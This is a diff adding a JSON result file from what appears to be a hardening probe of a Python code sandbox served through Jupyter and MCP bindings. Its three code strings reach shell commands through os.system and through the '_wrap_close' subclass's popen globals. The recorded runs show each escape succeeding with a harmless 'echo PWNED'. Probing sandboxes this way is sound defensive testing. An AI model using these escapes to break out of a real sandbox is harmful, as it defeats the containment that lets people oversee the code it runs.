@@ -1,0 +1,49 @@
+{
+  "probe": "P12",
+  "config": "hardened",
+  "codes": [
+    "subs = ().__class__.__base__.__subclasses__()\nnames = [c.__name__ for c in subs]\nmsg = 'SUBS ' + str(len(subs)) + ' ' + str('_wrap_close' in names) + ' ' + str('Popen' in names)\nprint(msg)\nmsg",
+    "msg = \"SYSTEM \" + str(__import__(\"os\").system(\"echo PWNED\"))\nprint(msg)\nmsg",
+    "wc = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close']\nmsg = 'WRAP ' + wc[0].__init__.__globals__['popen']('echo PWNED2').read()\nprint(msg)\nmsg"
+  ],
+  "runs": [
+    {
+      "ok": true,
+      "stdout": "SUBS 1805 True True",
+      "stderr": "",
+      "result": "'SUBS 1805 True True'",
+      "error": null,
+      "interrupted": false,
+      "ms": 13.7,
+      "started": 1795378319.063827
+    },
+    {
+      "ok": true,
+      "stdout": "PWNED\nSYSTEM 0",
+      "stderr": "",
+      "result": "'SYSTEM 0'",
+      "error": null,
+      "interrupted": false,
+      "ms": 14.2,
+      "started": 1795378319.077686
+    },
+    {
+      "ok": true,
+      "stdout": "WRAP PWNED2\n",
+      "stderr": "",
+      "result": "'WRAP PWNED2\\n'",
+      "error": null,
+      "interrupted": false,
+      "ms": 17.0,
+      "started": 1795378319.092066
+    }
+  ],
+  "setup_ms": 2579.8,
+  "done": true,
+  "killed": null,
+  "exit_code": 0,
+  "wall_s": 3.62,
+  "peak_tree_rss_gb": 0.378,
+  "calls": [],
+  "child_log_tail": "[11/22/26 15:11:56] INFO     Generating MCP bindings to            codegen.py:62\n                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              \n                             dpw0000gn/T/dl-jupyter-server-z040io3              \n                             s/generated (mcp dir:                              \n                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              \n                             dpw0000gn/T/dl-jupyter-server-z040io3              \n                             s/generated/mcp)                                   \n                    INFO     Generating bindings for server        codegen.py:73\n                             'probe' into                                       \n                             /var/folders/tg/x0gcvxzs2ks8jyz23g3pg              \n                             dpw0000gn/T/dl-jupyter-server-z040io3              \n                             s/generated/mcp/probe                              \n                    INFO     Starting Jupyter server       jupyter_server.py:262\n                             subprocess on 127.0.0.1:41520                      \n                             (workdir=/var/folders/tg/x0gc                      \n                             vxzs2ks8jyz23g3pgdpw0000gn/T/                      \n                             code-sandbox-19vu3u1o)                             \n[11/22/26 15:11:57] INFO     No existing kernels found,    jupyter_server.py:412\n                             will create a new one                              \n                    INFO     Starting the kernel client\u2026           client.py:412\n                    INFO     KernelHttpManager created a new      manager.py:258\n                             kernel: {'id':                                     \n                             '56fc2183-e245-4980-848f-096d65d0f54               \n                             4', 'name': 'python3',                             \n                             'last_activity':                                   \n                             '2026-11-22T20:11:57.852793Z',                     \n                             'execution_state': 'starting',                     \n                             'connections': 0}                                  \n                    INFO     Websocket connected                 _logging.py:104\n[11/22/26 15:11:59] INFO     Stopping the kernel client\u2026           client.py:433\n"
+}
